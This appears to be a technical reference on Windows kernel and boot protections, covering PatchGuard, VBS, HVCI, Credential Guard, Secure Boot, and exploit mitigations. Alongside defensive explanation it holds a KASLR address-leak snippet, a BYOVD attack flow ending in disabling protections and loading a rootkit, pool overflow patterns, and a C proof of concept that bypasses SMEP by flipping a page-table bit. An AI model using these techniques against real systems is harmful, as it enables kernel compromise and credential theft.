Kernel Patch Protection (PatchGuard / KPP)

What PatchGuard Protects

PatchGuard monitors the integrity of critical kernel structures. If modification is detected, it issues a CRITICAL_STRUCTURE_CORRUPTION (0x109) bugcheck.

How PatchGuard Works Internally

  • Initialization: During boot, KPP creates an encrypted "protection context" stored in a randomized pool allocation. The context contains checksums of all monitored structures.
  • Timer mechanism: Uses DPC (Deferred Procedure Call) timers with randomized intervals (5–10 minutes). The timer callback is obfuscated — it's not a simple function pointer.
  • Encrypted context: The verification context is encrypted with a key derived from system state. Each check decrypts the context, validates structures, re-encrypts with a new key.
  • Multiple entry points: PatchGuard code is dispersed throughout ntoskrnl.exe. It's triggered from multiple code paths (DPC callbacks, workitems, exception handlers, APC routines) making it impossible to hook a single function.
  • Self-protection: PatchGuard monitors its own timer objects. If a timer is cancelled, it triggers the bugcheck from an alternate path.
  • Obfuscation: Heavy use of code obfuscation (opaque predicates, control flow flattening) in the verification routines to resist static analysis.

PatchGuard and Secure Kernel

On VBS-enabled systems, PatchGuard's integrity verification is reinforced by the Secure Kernel (VTL 1). The Secure Kernel holds a copy of the protected structures' hashes. Even if PatchGuard is bypassed at VTL 0, the Secure Kernel independently detects tampering via Second Level Address Translation (SLAT) page fault interception. This makes VBS + PatchGuard significantly harder to defeat than PatchGuard alone.

WHQL Certification

Windows Hardware Quality Labs (WHQL) testing validates driver stability. After passing HLK tests, Microsoft signs the driver package. Drivers with WHQL signatures get preferential treatment during Windows Update and Secure Boot enforcement.

Virtualization-Based Security (VBS)

Architecture Overview

VBS uses the Windows Hypervisor to create isolated virtual trust levels (VTLs). The hypervisor runs at the highest privilege and mediates all memory access via SLAT (Second Level Address Translation / Extended Page Tables).

ComponentVTL 0 (Normal World)VTL 1 (Secure World)
Kernelntoskrnl.exe (Windows kernel)securekernel.exe (Secure Kernel)
User-modeNormal processesTrustlets (IUM processes): LsaIso.exe, etc.
Memory accessCannot see/modify VTL 1 memoryCan see VTL 0 memory (for services), but isolated own pages
PrivilegeRing 0 of VTL 0 < Ring 3 of VTL 1 (in terms of memory isolation)Protected by hypervisor EPT permissions

Hypervisor Role

  • Runs as a Type-1 hypervisor (bare-metal) below both VTLs
  • Manages EPT/SLAT tables: assigns per-VTL page permissions (Read/Write/Execute per VTL)
  • Intercepts sensitive operations (VMCALL, MSR access, CR writes) from VTL 0
  • Provides hypercall interface for VTL transitions (VTL call/return)
  • Enforces W^X on kernel memory (pages cannot be both Writable and Executable simultaneously)

HVCI (Hypervisor-Protected Code Integrity)

HVCI enforces code integrity at the hypervisor level. Even kernel-mode code at VTL 0 cannot execute unsigned code because the hypervisor controls page table permissions.

  • Mechanism: Before any kernel page is marked executable in VTL 0's page tables, the Secure Kernel (VTL 1) must validate the code's signature. The hypervisor prevents VTL 0 from directly modifying its own page table execute bits.
  • Effect: No allocation of RWX kernel memory. NX pool allocations enforced. Runtime kernel code generation blocked.
  • Blocks: BYOVD shellcode injection, pool spray with executable code, unsigned driver loading even after DSE bypass of ci!g_CiOptions
  • Limitations: Doesn't prevent data-only attacks (corrupting function pointers to existing signed code = code reuse attacks)

Memory/Register Protection Between VTLs

  • EPT isolation: VTL 1 memory pages have VTL 0 EPT entries set to no-read/no-write/no-execute. Hardware-enforced.
  • Register state: On VTL transition, the hypervisor saves/restores register state. VTL 0 cannot read VTL 1's register contents.
  • Interrupt isolation: VTL 1 can mask interrupts during sensitive operations; VTL 0 cannot inject interrupts into VTL 1.
  • DMA protection: IOMMU (VT-d) prevents DMA devices from accessing VTL 1 memory.

Credential Guard

Architecture

Credential Guard runs the LSA (Local Security Authority) secrets inside an isolated VTL 1 trustlet process: LsaIso.exe (LSA Isolated). The normal lsass.exe at VTL 0 communicates with LsaIso via secure RPC but never has direct access to the credential material.

What IS Protected

  • NTLM password hashes (derived credentials)
  • Kerberos TGT (Ticket Granting Tickets)
  • Kerberos session keys
  • Domain-derived credentials (DPAPI domain backup key protection)

What is NOT Protected

  • Local account password hashes (stored in SAM, not domain creds)
  • Service account passwords (stored in LSA secrets in registry)
  • Cached domain logon data (DCC2 hashes in SECURITY hive)
  • Machine account password (SECURITY hive)
  • Credentials for non-domain protocols (WDigest if enabled, CredSSP)
  • Application-specific credentials (browser passwords, etc.)

Attack Surface Reduction

  • Mimikatz sekurlsa::logonpasswords: Returns encrypted blobs instead of plaintext/hashes for protected credentials
  • Pass-the-Hash: NTLM hash stored in VTL 1; cannot be extracted by VTL 0 kernel-mode code
  • Memory dump of lsass.exe: Only contains proxy handles, not actual secrets

Secure Boot & UEFI

Boot Chain

Each stage verifies the next before handing off execution:

  1. UEFI Firmware (SEC/PEI/DXE): Platform initialization; loads Secure Boot keys from NVRAM
  2. Boot Manager (bootmgfw.efi): Verified against db; selects boot entry
  3. Windows Boot Loader (winload.efi): Loads kernel, HAL, boot-start drivers; verifies their signatures
  4. Kernel (ntoskrnl.exe): Initializes system, loads remaining drivers
  5. ELAM Driver: First third-party driver to load; can classify subsequent boot-start drivers
  6. Boot-start Drivers: Loaded in dependency order; classified by ELAM as Good/Bad/Unknown

Measured Boot & TPM

  • PCR 0-7: Firmware measurements (code, configuration, Secure Boot state)
  • PCR 8-15: OS boot measurements (boot manager, boot loader, boot drivers)
  • Boot Attestation: Remote attestation service can verify PCR values against expected-good measurements (health attestation)
  • BitLocker: Seals volume encryption key to specific PCR values → changing boot chain breaks decryption

Early Launch Anti-Malware (ELAM)

  • Loaded before any third-party boot-start drivers
  • Receives callbacks for each subsequent boot-start driver load
  • Classifies drivers: Known Good, Known Bad, Unknown
  • Policy determines action: Load All, Load Good+Unknown, Load Good Only
  • ELAM drivers must be signed by Microsoft (special ELAM certificate)
  • Limited functionality: small, no runtime deps, measurement-based only

Bootkit Attacks & BlackLotus (CVE-2023-24932)

BlackLotus was the first in-the-wild UEFI bootkit to bypass Secure Boot on fully patched Windows 11 systems:

  • Vulnerability: Exploited a Secure Boot bypass (CVE-2022-21894 / "Baton Drop") — a signed Windows boot application with a logic flaw that allowed loading arbitrary code
  • Mechanism: Used a legitimately signed but vulnerable bootmgfw.efi to chain into attacker code before the kernel loads
  • Persistence: Modifies EFI System Partition; survives OS reinstall
  • Capabilities: Disables BitLocker, HVCI, Windows Defender; loads unsigned kernel drivers
  • Fix complexity: Requires dbx update to revoke old bootloaders; Microsoft rolled out fix in phases due to risk of bricking systems

Kernel Exploit Mitigations

KASLR (Kernel Address Space Layout Randomization)

  • Mechanism: Kernel image base randomized from ~256 possible positions (8 bits entropy) at each boot
  • Applies to: ntoskrnl.exe, hal.dll, kernel drivers, kernel pool base addresses
  • Weakness: Low entropy compared to user-mode ASLR (only position within ~16MB range)
  • Information leaks via NtQuerySystemInformation:
    • SystemModuleInformation (class 11): Returns base addresses of all loaded kernel modules — available from Medium IL prior to mitigation
    • SystemBigPoolInformation (class 66): Pool allocation addresses + tags
    • SystemHandleInformation (class 16): Kernel object addresses
    • Mitigated in recent builds: requires admin or medium+ IL with specific process flags
// Classic KASLR leak (requires elevation on modern Windows)
NTSTATUS status;
ULONG returnLength;
PSYSTEM_MODULE_INFORMATION pModInfo;

NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &returnLength);
pModInfo = (PSYSTEM_MODULE_INFORMATION)malloc(returnLength);
status = NtQuerySystemInformation(SystemModuleInformation, pModInfo, returnLength, &returnLength);

// pModInfo->Modules[0].ImageBase == ntoskrnl.exe base address
printf("ntoskrnl base: 0x%p\n", pModInfo->Modules[0].ImageBase);

SMEP (Supervisor Mode Execution Prevention)

  • CPU feature: CR4.SMEP (bit 20); supported since Intel Ivy Bridge / AMD Zen
  • Effect: If CPL=0 (ring 0) attempts to fetch instructions from a user-mode page (U/S bit set in PTE), generates #PF
  • Bypass techniques:
    • Flip CR4.SMEP bit (requires arbitrary MSR write or ROP gadget: mov cr4, rxx; ret)
    • Remap shellcode in kernel space (flip U/S bit in PTE for target page)
    • ROP chain using only kernel-mode gadgets (don't execute user pages)
    • Use kernel pool spray to get executable code into kernel pages

SMAP (Supervisor Mode Access Prevention)

  • CPU feature: CR4.SMAP (bit 21); supported since Intel Broadwell / AMD Zen
  • Effect: Ring 0 cannot read/write user-mode pages unless EFLAGS.AC is set (via STAC/CLAC instructions)
  • Significance: Prevents kernel from being tricked into using attacker-controlled user-space data structures
  • Bypass: ROP gadget with STAC; or flip CR4.SMAP; or only use kernel-space data
  • Windows adoption: Enforced since Windows 10 1607+

CET (Control-flow Enforcement Technology)

  • Shadow Stack: Hardware-maintained return address stack. On RET, compares return address against shadow stack value. Mismatch → #CP exception.
  • IBT (Indirect Branch Tracking): Indirect JMP/CALL must land on an ENDBRANCH instruction. Landing elsewhere → #CP.
  • Kernel CET: Enabled in Windows 11+ kernels. Shadow stack pages marked with a special PTE bit, non-writable by normal stores.
  • Bypass difficulty: Must corrupt shadow stack (requires physical memory access or hypervisor-level primitive); or use gadgets that end at ENDBRANCH (very limited).

Kernel Pool Hardening

  • Safe unlinking: Validates forward/backward pointers before unlinking from free list (prevents classic unlink exploitation)
  • Pool cookies: Random canary values in pool headers; validated on free
  • NonPagedPoolNx: Default non-paged pool is non-executable (since Win 8). Must use ExAllocatePool2 with explicit POOL_FLAG_NON_PAGED_EXECUTE for executable pool.
  • Pool quota hardening: Quota pointer validation prevents arbitrary decrement primitives
  • Segment Heap (kernel): Windows 10 20H1+ uses segment heap in kernel. Different allocation patterns, metadata layout, makes traditional pool spray harder.

KVAS (Kernel Virtual Address Shadow) — Meltdown Mitigation

  • Problem: Meltdown (CVE-2017-5754) allows user-mode to read kernel memory via speculative execution side-channel
  • Solution: Two sets of page tables — user page tables don't map kernel memory (except minimal trampoline). On syscall entry, switch to kernel page tables; on return, switch back.
  • Performance: ~5-30% overhead on syscall-heavy workloads (TLB flush on context switch)
  • Modern CPUs: Not needed on CPUs with hardware fix (Intel Ice Lake+, AMD Zen 2+ not affected)

Pool Overflow Exploitation Patterns

  1. Adjacent object corruption: Overflow from one pool allocation into the next. If the next object has a function pointer or linked list pointers → code execution or arbitrary write.
  2. Pool header corruption: Overflow into the POOL_HEADER of the adjacent chunk. Modify PoolType, PoolTag, or ProcessBilled (quota pointer) to gain a primitive on free.
  3. Lookaside list poisoning: Corrupt lookaside free list pointer. Next allocation returns attacker-controlled address.

Segment Heap in Kernel

  • Windows 10 20H1+ replaced the legacy pool allocator with Segment Heap
  • Three bucket types: LFH (Low Fragmentation Heap) for small, VS (Variable Size) for medium, Segment for large
  • Metadata stored separately from data (out-of-band headers) — harder to corrupt
  • Randomized allocation patterns in LFH buckets
  • Requires different spray strategies; traditional sequential adjacency less predictable

BYOVD (Bring Your Own Vulnerable Driver) Attack Pattern

Attack Flow

  1. Find a signed vulnerable driver — search LOLDrivers project, known CVEs, or audit IOCTL handlers of hardware utility drivers
  2. Obtain the driver binary — extract from vendor installer or download from public sources
  3. Load the driver — requires Administrator. Use sc create / NtLoadDriver / CreateService
  4. Interact via IOCTLs — send crafted DeviceIoControl requests to exploit the vulnerability
  5. Gain kernel primitive — arbitrary read/write, MSR write, physical memory map, etc.
  6. Disable protections — patch PatchGuard, DSE, PPL, callbacks
  7. Deploy payload — load unsigned rootkit, steal credentials, etc.

// SMEP prevents kernel from executing user-mode pages
// Bypass: Flip the U/S bit in the PTE so the page appears as kernel-mode (Supervisor)
// The CPU then allows execution from that page while in ring 0

#include <windows.h>
#include <stdio.h>

// PTE self-referencing entry base (Windows 10, pre-randomization)
// Modern builds randomize this, need to leak from MiGetPteAddress
#define PTE_BASE 0xFFFFF68000000000ULL
#define PDE_BASE 0xFFFFF6FB40000000ULL

DWORD64 GetPTEAddress(DWORD64 virtualAddress) {
    // PTE_VA = PTE_BASE + (VA >> 12) * 8
    return PTE_BASE + ((virtualAddress >> 12) << 3);
}

// User-mode shellcode (token stealing, etc.)
BYTE shellcode[] = {
    // ... your shellcode here ...
    0xC3 // ret (placeholder)
};

int main() {
    // Allocate shellcode at a known user-mode address
    LPVOID scAddr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(scAddr, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at user VA: 0x%p\n", scAddr);
    
    // Calculate PTE address for shellcode page
    DWORD64 pteAddr = GetPTEAddress((DWORD64)scAddr);
    printf("[+] PTE address: 0x%llX\n", pteAddr);
    
    // Read current PTE
    DWORD64 pte = KernelRead64(pteAddr);
    printf("[+] Current PTE: 0x%llX\n", pte);
    printf("    U/S bit (2): %d (1=User, 0=Supervisor)\n", (pte >> 2) & 1);
    
    // Clear U/S bit (bit 2) → page becomes Supervisor
    DWORD64 newPte = pte & ~(1ULL << 2);
    KernelWrite64(pteAddr, newPte);
    printf("[+] Modified PTE: 0x%llX (U/S=0, now Supervisor page)\n", newPte);
    
    // Now when kernel executes code at scAddr, SMEP won't trigger
    // because the page is marked as Supervisor
    
    // Trigger kernel to jump to our shellcode address
    // (via whatever vulnerability/exploit path you have)
    printf("[+] SMEP bypassed. Kernel can now execute shellcode at 0x%p\n", scAddr);
    
    // IMPORTANT: Flush TLB after PTE modification
    // In practice, call invlpg or trigger context switch
    
    return 0;
}
